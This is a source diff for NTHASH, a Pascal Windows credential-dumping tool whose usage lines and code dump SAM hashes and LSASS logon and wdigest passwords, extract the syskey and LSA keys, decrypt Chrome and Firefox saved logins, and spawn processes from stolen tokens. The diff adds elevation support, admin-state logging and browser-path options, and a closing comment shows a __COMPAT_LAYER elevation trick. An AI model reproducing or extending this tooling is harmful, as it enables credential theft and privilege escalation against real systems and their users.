@@ -5,7 +5,7 @@ program NTHASH;
 
 uses windows, classes, sysutils, dos, usamlib, usid, uimagehlp, upsapi,uadvapi32,
    untdll,utils,  umemory, ucryptoapi, usamutils, uofflinereg,
-  uvaults, uLSA, uchrome, ufirefox;
+  uvaults, uLSA, uchrome, ufirefox, urunelevatedsupport;
 
 type _LUID =record
      LowPart:DWORD;
@@ -293,6 +293,7 @@ var
   mystringsid:pchar;
   sysdir:pchar;
   syskey,samkey,ntlmhash:tbyte16;
+  label fin;
 
 
 
@@ -1105,10 +1106,10 @@ ZeroMemory(@StartupInfo, SizeOf(TStartupInfoW));
     strtoint(pid ));
     if result then
        begin
-       log('pid:'+inttostr(ProcessInformation.dwProcessId ));
+       log('pid:'+inttostr(ProcessInformation.dwProcessId )+' integrity:'+inttostr(i));
        break;
        end;
-    end;
+    end; //for i:=3 downto 0 do
 end;
 
 function callback_SamUsers(param:pointer=nil):dword;stdcall;
@@ -1185,6 +1186,8 @@ begin
     end; //if bret=true then
 end;
 
+
+
 begin
   log('NTHASH 1.4 by erwan2212@gmail.com',1);
   winver:=GetWindowsVer;
@@ -1192,13 +1195,18 @@ begin
   log('Windows Version:'+winver,1);
   log('Architecture:'+osarch,1);
   log('Username:'+GetCurrUserName,1);
-  log('DebugPrivilege:'+BoolToStr (EnableDebugPriv),1);
+  //log('IsAdministrator:'+BoolToStr (IsAdministrator),1);
+  log('IsAdministratorAccount:'+BoolToStr (IsAdministratorAccount,true),1);
+  log('IsElevated:'+BoolToStr (IsElevated,true),1);
+  log('DebugPrivilege:'+BoolToStr (EnableDebugPriv,true),1);
   lsass_pid:=_EnumProc('lsass.exe');
   log('LSASS PID:'+inttostr(lsass_pid ),1);
   getmem(sysdir,Max_Path );
   GetSystemDirectory(sysdir, MAX_PATH - 1);
   //
-  if paramcount=0 then
+  //RunElevated('');
+  //
+  if (paramcount=0) or ((paramcount=1) and (pos('/wait',cmdline)>0)) then
   begin
   log('NTHASH /setntlm [/server:hostname] /user:username /newhash:xxx',1);
   log('NTHASH /setntlm [/server:hostname] /user:username /newpwd:xxx',1);
@@ -1222,8 +1230,8 @@ begin
   log('NTHASH /enumcred',1);
   log('NTHASH /enumcred2',1);
   log('NTHASH /enumvault',1);
-  log('NTHASH /chrome',1);
-  log('NTHASH /firefox',1);
+  log('NTHASH /chrome [/user:path_to_folder_containing_login_data]',1);
+  log('NTHASH /firefox [/user:path_to_database]',1);
   log('NTHASH /bytestostring /input:hexabytes',1);
   log('NTHASH /stringtobytes /input:string',1);
   log('NTHASH /enumproc',1);
@@ -1233,6 +1241,7 @@ begin
   log('NTHASH /runasuser /user:username /password:password [/binary:x:\folder\bin.exe]',1);
   log('NTHASH /runastoken /pid:12345 [/binary:x:\folder\bin.exe]',1);
   log('NTHASH /runaschild /pid:12345 [/binary:x:\folder\bin.exe]',1);
+  log('NTHASH /runas',1);
   log('NTHASH /enumpriv',1);
   log('NTHASH /enumproc',1);
   log('NTHASH /killproc /pid:12345',1);
@@ -1257,7 +1266,7 @@ begin
      if (not FileExists ('sam.sav')) or (not FileExists ('system.sav')) then
         begin
         log('sam.sav and/or system.sav missing',1);
-        exit;
+        goto fin;
         end;
      end;
   //
@@ -1280,13 +1289,14 @@ begin
    begin
    //uvaults.VaultInit ;
    uvaults.patch (lsass_pid ); //calling enumvault seems to bring back an encrypted blob
-   exit;
+   goto fin;
    end;
     p:=pos('/enumvault',cmdline);
   if p>0 then
      begin
      uvaults.VaultInit ;
      uvaults.Vaultenum ;
+     goto fin;
      end;
   p:=pos('/enumcred',cmdline);
   if p>0 then
@@ -1296,6 +1306,7 @@ begin
        except
        on e:exception do log(e.message);
        end;
+       goto fin;
      end;
   p:=pos('/getlsakeys',cmdline);
   if p>0 then
@@ -1306,7 +1317,7 @@ begin
         log('DESKey:'+ByteToHexaString (deskey),1);
         log('AESKey:'+ByteToHexaString (aeskey),1);
         end;
-     exit;
+     goto fin;
      end;
   p:=pos('/logonpasswords',cmdline);
   if p>0 then
@@ -1314,6 +1325,7 @@ begin
      findlsakeys (lsass_pid,deskey,aeskey,iv );
      //logonpasswords (lsass_pid,0,'',@callback_LogonPasswords );
      logonpasswords (lsass_pid );
+     goto fin;
      end;
   p:=pos('/wdigest',cmdline);
   if p>0 then
@@ -1321,13 +1333,13 @@ begin
      if findlsakeys (lsass_pid,deskey,aeskey,iv )=true
         then wdigest (lsass_pid)
         else log('findlsakeys failed',1);
-     exit;
+     goto fin;
      end;
   p:=pos('/enumpriv',cmdline);
   if p>0 then
      begin
      if enumprivileges=false then writeln('enumprivileges NOT OK');
-     exit;
+     goto fin;
      end;
   p:=pos('/pid:',cmdline);
   if p>0 then
@@ -1375,7 +1387,7 @@ begin
      if getsyskey(syskey)
         then log('Syskey:'+ByteToHexaString(syskey) ,1)
         else log('getsyskey NOT OK' ,1);
-     exit;
+     goto fin;
      end;
   p:=pos('/getsamkey',cmdline);
   if p>0 then
@@ -1388,7 +1400,7 @@ begin
            else log('getsamkey NOT OK' ,1);
         end //if getsyskey(syskey) then
         else log('getsyskey NOT OK' ,1);
-     exit;
+     goto fin;
      end;
   p:=pos('/dumphashes',cmdline);
   if p>0 then
@@ -1405,12 +1417,12 @@ begin
            else log('getsamkey NOT OK' ,1);
         end //if getsyskey(syskey) then
         else log('getsyskey NOT OK' ,1);
-     exit;
+     goto fin;
      end;
   p:=pos('/dumphash',cmdline);
   if p>0 then
      begin
-     if rid='' then exit;
+     if rid='' then goto fin;
      if getsyskey(syskey) then
         begin
         log('SYSKey:'+ByteToHexaString(SYSKey) ,1);
@@ -1425,40 +1437,40 @@ begin
            else log('getsamkey NOT OK' ,1);
         end //if getsyskey(syskey) then
         else log('getsyskey NOT OK' ,1);
-     exit;
+     goto fin;
      end;
   p:=pos('/enumproc',cmdline);
     if p>0 then
        begin
        _EnumProc ;
-       exit;
+       goto fin;
        end;
     p:=pos('/enummod',cmdline);
     if p>0 then
        begin
        if pid='' then exit;
        _EnumMod(strtoint(pid),'');
-       exit;
+       goto fin;
        end;
   p:=pos('/dumpproc',cmdline);
   if p>0 then
      begin
      if pid='' then exit;
      if dumpprocess (strtoint(pid)) then log('OK',1) else log('NOT OK',1);
-     exit;
+     goto fin;
      end;
   p:=pos('/killproc',cmdline);
   if p>0 then
      begin
      if pid='' then exit;
      if _killproc(strtoint(pid)) then log('OK',1) else log('NOT OK',1);
-     exit;
+     goto fin;
      end;
   p:=pos('/dumpsam',cmdline);
   if p>0 then
      begin
      if dumpsam (lsass_pid ,'') then log('OK',1) else log('NOT OK',1);
-     exit;
+     goto fin;
      end;
   p:=pos('/server:',cmdline);
   if p>0 then
@@ -1497,19 +1509,19 @@ begin
            begin
            if password='' then exit;
            log (GenerateNTLMHash (password),1);
-           exit;
+           goto fin;
            end;
   p:=pos('/getusers',cmdline);
   if p>0 then
        begin
        QueryUsers (pchar(server),'',nil );
-       exit;
+       goto fin;
        end;
   p:=pos('/getdomains',cmdline);
   if p>0 then
        begin
        QueryDomains (pchar(server),nil );
-       exit;
+       goto fin;
        end;
   p:=pos('/getsid',cmdline);
   if p>0 then
@@ -1517,7 +1529,7 @@ begin
        GetAccountSid2(widestring(server),widestring(user),mypsid);
        ConvertSidToStringSidA (mypsid,mystringsid);
        log(mystringsid,1);
-       exit;
+       goto fin;
        end;
   p:=pos('/oldhash:',cmdline);
   if p>0 then
@@ -1579,7 +1591,7 @@ begin
      if binary='' then binary:=sysdir+'\cmd.Exe';
      if createprocessaspid   (binary,pid)
         then log('OK',1) else log('NOT OK',1);
-     exit;
+     goto fin;
      end;
   p:=pos('/runasuser',cmdline);
   if p>0 then
@@ -1602,7 +1614,7 @@ begin
      if binary='' then binary:=sysdir+'\cmd.Exe';
      if CreateProcessOnParentProcess(strtoint(pid),binary)=true
         then log('OK',1) else log('NOT OK',1);
-     exit;
+     goto fin;
      end;
   p:=pos('/cryptunprotectdata',cmdline);
   if p>0 then
@@ -1631,16 +1643,34 @@ begin
   p:=pos('/chrome',cmdline);
   if p>0 then
    begin
-   decrypt_chrome;
+   decrypt_chrome(user);
    end;
   p:=pos('/firefox',cmdline);
   if p>0 then
    begin
-   decrypt_firefox;
+   decrypt_firefox(user);
    end;
+  p:=pos('/runas',cmdline);
+  if p>0 then
+   begin
+   runas;
+   end;
+  fin:
+  p:=pos('/wait',cmdline);
+  if p>0 then readln;
+
 end.
 
 //todo
 //{ "masterkey", "lsasrv!g_MasterKeyCacheList", 0, NULL }, // kuhl_m_sekurlsa_enum_logon_callback_masterkeys },
 //{ "masterkey", "dpapisrv!g_MasterKeyCacheList", 0, NULL }, // kuhl_m_sekurlsa_enum_logon_callback_masterkeys },
 
+
+{
+rem Run next command elevated to Admin.
+set __COMPAT_LAYER=RunAsAdmin
+some command
+rem Disable elevation
+set __COMPAT_LAYER=
+rem continue non elevated
+}
